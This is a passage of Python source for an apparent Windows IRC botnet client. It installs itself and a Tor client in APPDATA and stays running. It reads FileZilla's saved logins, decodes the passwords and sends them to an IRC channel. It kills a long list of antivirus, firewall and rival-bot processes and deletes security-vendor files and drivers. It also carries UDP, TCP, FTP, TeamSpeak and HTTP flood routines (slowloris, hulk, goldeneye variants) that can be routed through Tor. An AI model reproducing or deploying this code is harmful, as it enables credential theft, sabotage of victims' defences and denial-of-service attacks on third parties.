                    if path.isfile(getenv("APPDATA")+installDir+"\\"+botProc):
                        startfile(getenv("APPDATA")+installDir+"\\"+botProc)
                        worked=True
                        break
                    else:
                        try:
                            copyfile(argv[0], getenv("APPDATA")+installDir+"\\"+botProc)
                        except:
                            pass
            except:
                pass
            if worked == True:
                raise SystemExit
        if True == installTor:
            if not IsProcessRunning("tor.exe") and path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe"):
                if path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe:Zone.Identifier"):
                    try:
                        remove(getenv("APPDATA")+installDir+"\\Tor\\tor.exe:Zone.Identifier")
                    except:
                        pass
                try:
                    startfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe")
                except:
                    pass
                if not IsProcessRunning("tor.exe"):
                    for delFile in ["Tor", "Data"]:
                        try:
                            remove(getenv("APPDATA")+installDir+"\\Tor")
                        except:
                            pass
                    downloadTor(getenv("APPDATA")+installDir+"\\")
                    if path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe"):
                        if path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe:Zone.Identifier"):
                            try:
                                remove(getenv("APPDATA")+installDir+"\\Tor\\tor.exe:Zone.Identifier")
                            except:
                                pass
                        try:
                            startfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe")
                        except:
                            pass
            elif not path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe"):
                print "downloading Tor..."
                downloadTor(getenv("APPDATA")+installDir+"\\")
                if path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe"):
                    if path.isfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe:Zone.Identifier"):
                        try:
                            remove(getenv("APPDATA")+installDir+"\\Tor\\tor.exe:Zone.Identifier")
                        except:
                            pass
                    try:
                        startfile(getenv("APPDATA")+installDir+"\\Tor\\tor.exe")
                    except:
                        pass
if not IsProcessRunning(botProc) and not argv[0].endswith(botProc): #and not argv[0].endswith(botProc1):
    installTor=False
    installwindows()
else:
    start_new_thread(installwindows, ())
if installTor == True:
    start_new_thread(torwatch, ())
def shoitzilla(keyword,s,channel):
    FilePath = getenv("APPDATA")+"\\FileZilla\\recentservers.xml"
    if path.isfile(FilePath):
        sendmsg("FileZilla installed. Retrieving logins...", s, channel)
        f = open(FilePath)
        r = f.read()
        f.close()
        lines = r.split("<Server>")
        dstr = ""
        TempData = [""]
        Aoutput = ""
        for line in lines:
            output = ""
            if "<User>" in line:
                output=output+line.split("<User>")[1].split("</User>")[0]+"@"
            if "<Host>" in line:
                output=output+line.split("<Host>")[1].split("</Host>")[0]
            if "<Port>" in line:
                output=output+":"+line.split("<Port>")[1].split("</Port>")[0]
            if "<pass encoding=\"base64\">" in line:
                password=b64decode(line.split("<pass encoding=\"base64\">")[1].split("</pass>")[0])
                output=output+"|"+password
            output=output.replace("\n","")
            if keyword.lower() in output.lower() or keyword.lower() == "all" and "@" in output and ":" in output and "|" in output:
                sendmsg(output, s, channel)
        sendmsg("FileZilla logins retrieved.", s, channel)
    else:
        sendmsg("FileZilla not installed.", s, channel)
def advbotkiller():
    botprocs = ["miner", "stub", "bote", "pcihost", "worm", "ircbot", "rxbot", "aspergillus", "ch180", "wservice", "winmgr"]
    while doProtect == True:
        try:
            KillProcessandFileList(botprocs)
        except:
            pass
        sleep(60)
        try:
            appdata = listdir(getenv("APPDATA"))
            sleep(10)
            for affile in appdata:
                if ".exe" in affile or ".scr" in affile or ".dll" in affile or ".lnk" in affile or ".com" in affile or ".pif" in affile:
                    try:
                        if not ".dll" in affile:
                            pythoncom.CoInitialize()
                            c = wmi.WMI()
                            for process in c.Win32_Process():
                                handle = OpenProcess(PROCESS_ALL_ACCESS,False, process.ProcessId)
                                exe = GetModuleFileNameEx(handle, 0)
                                if affile in exe:
                                    process.Terminate()
                        remove(affile)
                        sleep(3)
                    except:
                        pass
        except:
            pass
        sleep(5)
def advavkiller():
    avprocs = ["rstrui", "n360", "avg", "avira", "patch", "clam", "superantispyware", "avg", "fsav", "fpav", "bullguard", "rkill", "teatimer", "avp", "regcure", "optimizer", "n360", "norton", "zonealarm", "wsbgate", "winsfcm",
               "adaware", "bluepoint", "nod32", "avast", "mbam", "bd_professional", "guard", "guarddog", "scan", "recovery", "psctrls", "tmccs", "pccnt", "ntrt", "tmpfw", "wyvernworksfirewall",
               "tmbm", "uise", "asmp", "ofcaos", "ircrc", "smex", "pcctl", "ofcpfw", "ntrt", "hvr", "sbam", "instzlh", "asoelnch", "restore", "neux", "sevinst", "minilog", "wnt", "wimmun32",
               "symdgn", "Symerr", "avmgma", "sysimins", "tuih", "adv", "gcasDtServ", "aavg", "avupgsvc", "maagent", "bdi", "bdbad", "Avch", "gzserv", "ccuac", "avwsc", "avweb", "winrecon",
               "mfev", "mfeann", "avcenter", "Avconfig", "avnotify", "avrestart", "avshadow", "avscan", "avg", "fsb", "fsd", "fsg", "fssm", "UpdClient.exe", "ccapp", "zatutor", "wradmin",
               "avss", "fsh", "fsor", "kav", "security", "anti-trojan", "clam", "avnt", "protectx", "f-agnt", "virusmadpersonalfirewall", "spyxx", "avw", "exantivirus", "winroute",
               "regcure", "_avp", "agent", "firewall", "armor", "antivirus", "esafe", "f-prot", "norton", "optimizer", "avconfig", "avscan", "instup", "zauinst", "wrctrl", "wqkmm3878",
               "hijackthis", "spybot", "ash", "ccuac", "avcenter", "egui", "egui", "zlclient", "bdagent", "keyscrambler", "avp", "wireshark", "tcpdump", "tshark", "whoswatchingme",
               "combofix", "msas", "mpcmdrun", "msseces", "msmpeng", "blindman", "sdfiles", "sdmain", "sdwinsec", "mghtml", "MsiExec", "outpost", "isafe", "zapro", "wgfe95", "wfindv32", "webtrap", "ccsetmgr", "ccsetmgr",
               "ccevtmgr", "Norton Auto-Protect", "cccproxy", "navw32", "norton", "navapsvc", "npfmntor", "logexprt", "nisum", "issvc", "cpdclnt", "pccntupd", "PCCTool", "tmproxy", "tmntsrv",
               "pop3trap", "tsc", "PavPrSrv", "padmin", "PavProt", "pandaav", "avengine", "apvxdwin", "webProxy", "avguard", "avgnt", "sched", "avsched32", "SCCOMM", "Spiderml", "vsserv",
               "bdswitch", "bdss", "INOTask", "caissdt", "InoRpc", "VetMsg", "vettray", "realmon", "nod32krn", "nod32", "nod32kui", "kav", "kavmm", "KAVPF", "avgemc", "avgcc", "avgamsvr", "avgupsvc", "avgw",
               "ashWebSv", "ashDisp", "ashmaisv", "ashserv", "aswupdsv", "ewidoctrl", "guard", "gcasDtServ", "MsMpEng", "mcafee", "mghtml", "MsiExec", "outpost", "isafe", "zapro", "zauinst",
               "UpdClient", "zlcliente", "minilog", "zonealarm", "zlclient", "ccapp", "AVGCtrl", "CSS_1630", "CSS-AVS", "AVGCC32", "AVGServ", "AVGServ9", "ewidoguard", "kavsvc", "MPFAgent", "MPFTray",
               "Mscifapp", "MSKSrvr", "PavPrS9x", "Nprotect", "Nsched32", "SymWSC", "mghml", "shed", "sgmain", "spywareguard", "kpf4gui", "kpf4ss", "mcdash", "mcdetect", "mcregwiz", "mcinfo",
               "oasclnt", "mpfconsole", "mpfservice", "mpfwizard", "mvtx", "_avp32", "_avpcc", "_avpm", "ackwin32", "advxdwin", "agentsvr", "agv", "ahnsd", "alertsvc", "alogserv", "amon", "amon9x", "amonavp32",
               "anti -trojan", "antivir", "antivirus", "ants", "antssircam", "apimonitor", "aplica32", "atcon", "atguard", "ats", "atscan", "atupdater", "atwatch", "autodown", "autotrace", "autoupdate",
               "ave32", "avgserv9schedapp", "avkpop", "avkserv", "avkservice", "avkwcl9", "avkwctl9", "avnt", "avp", "avp32", "avpcc", "AVPCC Service", "avpccavpm", "avpdos32", "avpexec",
               "avpinst", "avpm", "avpmonitor", "avptc", "avptc32", "avpupd", "avpupdates", "avrescue", "avsynmgr", "avwin95", "avwinnt", "avwupd32", "avxgui", "avxinit", "avxlive",
               "avxmonitor9x", "avxmonitornt", "avxnews", "avxquar", "avxsch", "avxw", "BACKLOG", "bd_professional", "bidef", "bidserver", "bipcp", "bisp", "blackd", "blackice", "blackiceblackd",
               "avconsol", "BootWarn", "borg2", "bs120", "bullguard", "ccIMScan", "ccPwdSrc", "ccpxysvc", "cdp", "cfiadmin", "cfiaudit", "cfinet", "cfinet32", "claw95", "claw95cf", "clean",
               "cleaner", "cleaner3", "cleanpc", "cmgrdian", "cmon016", "codered", "connectionmonitor", "conseal", "cpd", "cpf9x206", "ctrl", "defalert", "defence", "defense", "defscangui",
               "defwatch", "deputy", "doors", "dpf", "drwatson", "drweb32", "dvp95", "dvp95_0", "ecengine", "edisk", "efpeadm", "esafe", "escanh95", "escanhnt", "escanv95", "espwatch", "etrustcipe",
               "evpn", "exantivirus", "fameh32", "fast", "fch32", "fih32", "findviru", "firewall", "fix-it", "flowprotector", "fnrb32", "fp -win", "fp -win_trial", "fprot", "frw", "fsaa", "fsav32",
               "fsav95", "fsave32", "fsgk32", "fsm32", "fsma32", "fsmb32", "fwenc", "gbmenu", "gbpoll", "gedit", "generics", "grief3878", "guarddog", "HackerEliminator", "iamapp", "iamserv",
               "iamstats", "ibmasn", "ibmavsp", "icload95", "icloadnt", "icmon", "icsupp95", "icsuppnt", "iface", "ifw2000", "inoculateit", "iomon98", "iparmor", "iris", "isrv95", "jammer", "jedi", "ldnetmon",
               "ldpromenu", "ldscan", "localnet", "lockdown", "lookout", "luall", "lucomserver", "luspt", "mcagent", "mcmnhdlr", "mcshield", "mcshieldvvstat", "mctool", "mcupdate", "mcvsrte", "mcvsshld",
               "mgavrtcl", "mgavrte", "mgui", "mon", "monitor", "monsys32", "monsysnt", "moolive", "mrflux", "msinfo32", "mwatch", "mxtask", "n32scanw", "nav", "NAV DefAlert", "nav32", "navalert",
               "navap", "NAVAPW32", "navauto -protect", "navdx", "navengnavex15", "navlu32", "navnt", "navrunr", "navstub", "Navwnt", "nc2000", "ndd32", "neomonitor", "neowatchlog", "net2000",
               "netarmor", "netcommando", "netinfo", "netmon", "netpro", "netprotect", "netscanpro", "netspyhunter -1.2", "netstat", "netutils", "netutils]", "nimda", "nisserv", "nisumnisservnisum",
               "nmain", "norman", "norman_32", "norman_av", "norman32", "normanav", "normist", "norton_av", "nortonav", "notstart", "npfmessenger", "npfw", "npfw32", "npscheck", "npssvc", "nresq32", "nschednt",
               "nsplugin", "ntrtscan", "ntvdm", "ntxconfig", "nui", "nupgrade", "nvarch16", "nvc95", "nvsvc32", "nwservice", "nwtool16", "offguard", "OPScan", "ostronet", "panda", "panixk", "pav", "pavcl", "pavproxy",
               "pavsched", "pavw", "pc -cillan", "pc -cillin", "pccclient", "pccguide", "pcciomon", "pccntmon", "pccwin97", "pccwin98", "pcfwallicon", "pcscan", "periscope", "persfw", "pf2", "pfwadmin", "pingscan",
               "platin", "poproxy", "portdetective", "portmonitor", "ppinupdt", "pptbc", "ppvstop", "processmonitor", "procexplorerv10", "programauditor", "proport", "protectx", "pspf", "purge",
               "pview95", "pw32", "qconsole", "rav", "rav7", "rav7win", "regrun2", "rescue", "rrguard", "rshell", "rtvscn95", "rulaunch", "safeweb", "SAVscan", "sbserv", "SBservice", "scan", "scan32",
               "scan95", "scanpm", "scrscan", "sd", "SENS", "serv95", "sfc", "sh", "sharedaccess", "shn", "smc", "sofi", "sophos", "sophos_av", "sophosav", "spf", "sphinx", "spy", "spygate", "spyx", "spyxx",
               "srwatch", "ss3edit", "st2", "supftrl", "supp95", "supporter5", "sweep95", "sweepnet", "sweepsrv.sys", "sweepsrv.sysvshwin32", "swnetsup", "symantec", "Symantec Core LC", "symproxysvc", "symtray",
               "sysedit", "taskmon", "taumon", "tauscan", "tbscan", "tcm", "tctca", "tds -3", "tds2 -98", "tds2 -nt", "tfak", "tfak5", "tgbob", "trendmicro", "trjscan", "trojantrap3", "TrueVector", "undoboot",
               "vbcmserv", "vbcons", "vbust", "vbwin9x", "vbwinntw", "vccmserv", "vcontrol", "vet32", "vet95", "vir -help", "virus", "virusmdpersonalfirewall", "vnlan300", "vnpc3000", "vpc32", "vpfw30s",
               "vptray", "vscan40", "vsched", "avifil32", "vsecomr", "vshwin32", "vshwin32vbcmserv", "vsmain", "vsmon", "vsstat", "vswin9xe", "vswinntse", "w9x", "watchdog", "webscanx"]
    while doProtect == True:
        sleep(420)
        try:
            KillProcessandFileList(avprocs)
        except:
            pass
        if path.isfile("\\Documents and Settings\\All Users\\Desktop\\Immunet"):
            sleep(1)
            try:
                remove("\\Documents and Settings\\All Users\\Desktop\\Immunet")
            except:
                pass
        programfiles = [ "\\Program Files\\", "\\Program Files (x86)\\" ]
        avastdirs = ["Emsisoft Anti-Malware",
                     "Symantec",
                     "BluePoint Security",
                     "NortonInstaller",
                     "Norton 360",
                     "Norman",
                     "FRISK Software",
                     "norman",
                     "Bitdefender",
                     "Trend Micro",
                     "TrustPort",
                     "escan",
                     "AVG",
                     "CheckPoint",
                     "Kaspersky Lab",
                     "Webroot",
                     "Panda Security",
                     "Panda Software",
                     "Sunbelt Software",
                     "McAfee",
                     "Malwarebytes Anti-Malware",
                     "Optimizer Pro",
                     "AVAST Software",
                     "Wireshark",
                     "ImmunetSUPERAntiSpyware",
                     "CyberDefender",
                     "Avira",
                     "ViRobot",
                     "hauri",
                     "Hauri",
                     "Windows Defender",
                     "MarkAnyLavasoft",
                     "avifil342.exe",
                     "ParetoLogic"] 
        for avastdir in avastdirs:
            for programfile in programfiles:
                if path.isdir(programfile+avastdir):
                    sleep(1)
                    if "Sunbelt Software" == avastdir:
                        dirs= [
                            "\\Documents and Settings\\All Users\\Application Data\\Sunbelt\\AntiMalware",
                            "\\Documents and Settings\\"+getuser()+"\\Application Data\\Sunbelt\\AntiMalware",
                            "\\ProgramData\\"+getuser()+"\\AntiMalware",
                            getenv("APPDATA")+"\\Sunbelt",
                            "\\Users\\All Users\\Sunbelt\\AntiMalware",
                            "\\Windows\\System32\\sbbd.exe",
                            "\\Windows\\System32\\Drivers\\sbaphd.sys",
                            "\\Windows\\System32\\Drivers\\sbapifs.sys",
                            "\\Windows\\System32\\Drivers\\SBREDrv.sys",
                            "\\Windows\\System32\\Drivers\\sbtis.sys"
                            ]
                        for adir in dirs:
                            if "." in adir:
                                try:
                                    remove(adir)
                                except:
                                     pass
                            else:
                                try:
                                    rmtree(adir)
                                except:
                                    pass
                            sleep(1)
                    elif "Webroot" == avastdir:
                        adel = [
                            "\\Documents and Settings\\All Users\\Application Data\\WRData",
                            "\\ProgramData\\WRData",
                            "\\Documents and Settings\\"+getuser()+"\\Application Data\\Mozilla\\Firefox\\Profiles\\*\\extensions\\{8ac62a8b-8b3f-43ba-9b1a-90c299b9dfda}",
                            "\\Users\\"+getuser()+"\\AppData\\roaming\\Mozilla\\Firefox\\Profiles\\*\\extensions\\{8ac62a8b-8b3f-43ba-9b1a-90c299b9dfda}",
                            "\\Documents and Settings\\"+getuser()+"\\Local Settings\\Application Data\\Webroot",
                            "\\Users\\"+getuser()+"\\AppData\\Local\\Webroot",
                            "\\Windows\\System32\\WRusr.dll",
                            "\\Windows\\SysWow64\\WRusr.dll",
                            "\\Windows\\System32\\Drivers\\WRKrn.sys"
                            ]
                        for dlr in adel:
                            if "." in dlr:
                                try:
                                    remove(dlr)
                                except:
                                    pass
                            else:
                                try:
                                    rmtree(dlr)
                                except:
                                    pass
                    elif "ParetoLogic" == avastdir:
                        try:
                            remove(getenv("APPDATA")+"\\nPSWF32.dll")
                        except:
                            pass
                        sleep(1)
                        try:
                            remove(getenv("APPDATA")+"\\Protector-")
                        except:
                            pass
                        sleep(1)
                        try:
                            remove(getenv("APPDATA")+"\\result.db")
                        except:
                            pass
                        sleep(1)
                    elif "MarkAny" == avastdir:
                        sleep(1)
                        try:
                            rmtree(programfile+avastdir)
                        except:
                            pass
                    sleep(1)
start_new_thread(advavkiller, ())
start_new_thread(advbotkiller, ())
start_new_thread(regedit, ())
sleep(5)

useragents = [
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
 "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
 "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
 "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
 "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
 "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; da-dk) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
 "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
 "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
 "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
 "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
 "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
 "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
 "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
 "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130330 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130331 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0",
 "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
 "Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0",
 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
 "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36",
 "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)"
]

def udpflood(ahost, aport, aspeed):
    port = int(aport)
    host = ahost
    speed = aspeed
    while True == doUDPflood:
        try:
            s = socket(AF_INET, SOCK_DGRAM)
            s.sendto(choice(letters+digits)*randrange(0,256), (host, port))
            sleep(speed)
        except:
            pass

def teamspeak(ahost, aport, aSSLorNOT, ator):
    port = int(aport)
    host = ahost
    tor = ator
    SSLorNOT = aSSLorNOT
    doattack=True
    while True == doattack:
        if SSLorNOT == True and doTeamSpeaks == True:
            doattack = True
        elif SSLorNOT == False and doTeamSpeak == True:
            doattack = True
        else:
            doattack = False
        try:
            if True == tor:
                s = socksocket()
                s.setproxy(PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
            else:
                s = socket(AF_INET, SOCK_STREAM)
            s.connect((host, port))
            if True == SSLorNOT:
                wrap_socket(s)
            s.send("sl\r\n")
            s.send("sel "+str(port)+"\r\n")
            s.send("pl\r\n")
            s.send("msgall fuck_you\r\n")
            s.close()
        except:
            pass

def ftpflood(ahost, aport, aSSLorNOT, ator):
    port = int(aport)
    host = ahost
    tor = ator
    SSLorNOT = aSSLorNOT
    doattack=True
    while True == doattack:
        if SSLorNOT == True and doFTPSflood == True:
            doattack = True
        elif SSLorNOT == False and doFTPflood == True:
            doattack = True
        else:
            doattack = False
        try:
            if True == tor:
                s = socksocket()
                s.setproxy(PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
            else:
                s = socket(AF_INET, SOCK_STREAM)
            s.connect((host, port))
            if True == SSLorNOT:
                wrap_socket(s)
            s.send("USER anonymous\r\n")
            s.send("pass anonymous\r\n")
            s.close()
        except:
            pass

def tcpflood(aport, ahost, ator, assl):
    port = int(aport)
    host = ahost
    ssl = assl
    tor = ator
    doattack=True
    while True == doattack:
        if SSLorNOT == True and doSSLflood == True:
            doattack = True
        elif SSLorNOT == False and doTCPflood == True:
            doattack = True
        else:
            doattack = False
        try:
            if True == tor:
                s = socksocket()
                s.setproxy(PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
            else:
                s = socket(AF_INET, SOCK_STREAM)
            s.connect((host, port))
            if True == ssl:
                wrap_socket(s)
            s.send(choice(letters+digits)*randrange(0,256))
            s.close()
        except:
           pass

def httpflood(ahost, aport, aSSLorNOT, ator):
    port = int(aport)
    host = ahost
    tor = ator
    SSLorNOT = aSSLorNOT
    doattack=True
    while True == doattack:
        if SSLorNOT == True and doHTTPSflood == True:
            doattack = True
        elif SSLorNOT == False and doHTTPflood == True:
            doattack = True
        else:
            doattack = False
        try:
            if True == tor:
                s = socksocket()
                s.setproxy(PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
            else:
                s = socket(AF_INET, SOCK_STREAM)
            s.connect((host, port))
            if True == SSLorNOT:
                wrap_socket(s)
            options = [ "torshammer", "postit", "hulk", "apachekiller", "slowloris", "goldeneye" ]
            option = choice(options)
            if "torshammer" == option:
                s.send("POST / HTTP/1.1\r\n")
                s.send("Host: "+host+"\r\n")
                s.send("User-Agent: "+choice(useragents)+"\r\n")
                s.send("Connection: keep-alive\r\n")
                s.send("Cache-Control: no-cache\r\n")
                s.send("Keep-Alive: 900\r\n")
                s.send("Content-Length: 10000\r\n")
                s.send("Content-Type: application/x-www-form-urlencoded\r\n\r\n")
                for i in range(0, 9999):
                    if False == doddos:
                        break
                    else:
                        s.send(choice(letters+digits))
            elif "slowloris" == option:
                request = "GET /"+choice(letters+digits)+" HTTP/1.1\r\n"
                request = request + "Host: " + host + "\r\n"
                request = request + "User-Agent: %s\r\n" % (choice(useragents))
                request = request + "Content-Length: 42\r\n\r\n"
                s.send(request)
            elif "postit" == option:
                post = "x" * 6000
                thefile = "index.php"
                typeofrequest = [ "GET", "POST" ]
                request = "%s /%s HTTP/1.1\r\n" % (choice(typeofrequest), thefile)
                request += "Host: %s\r\n" % (host)
                request += "User-Agent: %s\r\n" % (choice(useragents))
                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += "Accept-Language: en-us,en;q=0.5\r\n"
                request += "Accept-Encoding: gzip,deflate\r\n"
                request += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                request += "Keep-Alive: 900\r\n"
                request += "Connection: keep-alive\r\n"
                request += "Cache-Control: no-cache\r\n"
                request += "Content-Type: application/x-www-form-urlencoded\r\n"
                request += "Content-Length: %s\r\n\r\n" % (len(post))
                newrequest = "%s\r\n" % (post)
                newrequest += "\r\n"
                s.send(request)
                for c in newrequest:
                    s.send(c)
            elif "hulk" == option:
                referers = [
                 "http://www.google.com/?q="+choice(letters+digits),
                 "http://www.bing.com/"+choice(letters+digits),
                 "http://www.baidu.com/"+choice(letters+digits),
                 "http://www.yandex.ru/"+choice(letters+digits),
                 "http://www.usatoday.com/search/results?q="+choice(letters+digits),
                 "http://engadget.search.aol.com/search?q="+choice(letters+digits),
                 "http://" + host + "/"
                ]
                s.send("GET / HTTP/1.1\r\n")
                s.send("Host: "+host+"\r\n")
                s.send("User-Agent: "+choice(useragents)+"\r\n")
                s.send("Cache-Control: no-cache\r\n")
                s.send("Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n")
                s.send("Referer: "+choice(referers)+"\r\n")
                s.send("Keep-Alive: "+str(randrange(110,120))+"\r\n")
                s.send("Connection: keep-alive\r\n")
            elif "goldeneye" == option:
                request = "GET / HTTP/1.1\r\n"
                request = request + "User-Agent: " + choice(letters+digits) + "\r\n"
                request = request + "Cache-Control: no-cache\r\n"
                request = request + "Accept-Encoding: *,identity,gzip,deflate\r\n"
                request = request + "Accept-Charset: ISO-8859-1, utf-8, Windows-1251, ISO-8859-2, ISO-8859-15\r\n"
                request = request + "Referer: " + choice(referers) + "\r\n"
                request = request + "Connection: keep-alive\r\n"
                request = request + "Keep-Alive: " + str(randrange(1000,20000)) + "\r\n"
                request = request + "Content-Type: multipart/form-data, application/x-url-encoded\r\n"
